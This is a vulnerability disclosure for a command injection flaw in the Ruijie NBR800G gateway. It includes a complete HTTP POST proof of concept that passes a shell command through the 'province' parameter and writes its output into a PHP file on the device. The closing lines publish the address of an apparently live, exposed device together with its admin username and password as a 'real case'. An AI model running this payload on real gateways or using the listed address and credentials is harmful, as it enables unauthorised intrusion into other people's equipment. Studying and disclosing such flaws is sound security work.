# Ruijie NBR800G gateway has command execution vulnerability

## Overview
Manufacturer's address：[(https://222.170.147.52:4430/)]
## Vulnerability impact
Ruijie NBR800G gateway NBR_RGOS_11.1(6)B4P9
## Vulnerability location
/itbox_pi/networksafe.php
## Vulnerability details
<br /> Ruijie Networks is a professional network manufacturer with a full range of network equipment product lines and solutions including switches, routers, software, security firewalls, wireless products, storage, etc.
<br /> Ruijie NBR800G gateway has a command execution vulnerability. An attacker can obtain server permissions through the vulnerability, causing the server to crash.
<br /> This vulnerability is the result of code audit, so no Internet cases are provided. The detailed steps of code analysis and part of the vulnerability source code in the document are for reference only.
## Vulnerability verify
[(https://222.170.147.52:4430/)]
<br /> 1.Code analysis
<br /> The province parameter is controllable, and the splicing is brought to ` `, causing the command to be executed.
<br />![image](https://github.com/user-attachments/assets/bcde24bf-934f-4603-ae09-31aa66c2b410)
<br /> 2.Local reproduction
<br /> Login interface
<br /> ![image](https://github.com/user-attachments/assets/bd645fc3-c7b0-43b7-849b-e7777e4c582c)
<br /> Product version certificate
<br /> ![image](https://github.com/user-attachments/assets/93e3896a-13eb-447e-904f-2c1d1032c8eb)
<br /> The command can be executed directly through the province parameter. Since exec has no echo, here we pass the whoami test and write it into 1.php.
<br /> POC
<br /> POST /itbox_pi/networksafe.php?a=list HTTP/1.1
<br /> Host: 127.0.0.1:4430
<br />Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=vh60slsfgs4krrhfqhho0h6f31; user=admin
<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
<br />Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<br />Accept-Encoding: gzip, deflate, br
<br />Upgrade-Insecure-Requests: 1
<br />Sec-Fetch-Dest: document
<br />Sec-Fetch-Mode: navigate
<br />Sec-Fetch-Site: none
<br />Sec-Fetch-User: ?1
<br />X-Forwarded-For: 192.168.12.3
<br />If-Modified-Since: Tue, 04 Jul 2017 08:28:20 GMT
<br />Priority: u=0, i
<br />Te: trailers
<br />Connection: keep-alive
<br />Content-Type: application/x-www-form-urlencoded
<br />Content-Length: 25
<br />province=|echo `id`>1.php
<br />Visit /itbox_pi/1.php and execute id
<br />![image](https://github.com/user-attachments/assets/c0b68ba4-dc31-4c0a-a1ad-95556b511fbd)
<br />To facilitate review and retest, a real case verification is provided.
<br /> https://222.170.147.52:4430/
<br /> admin/123123aA
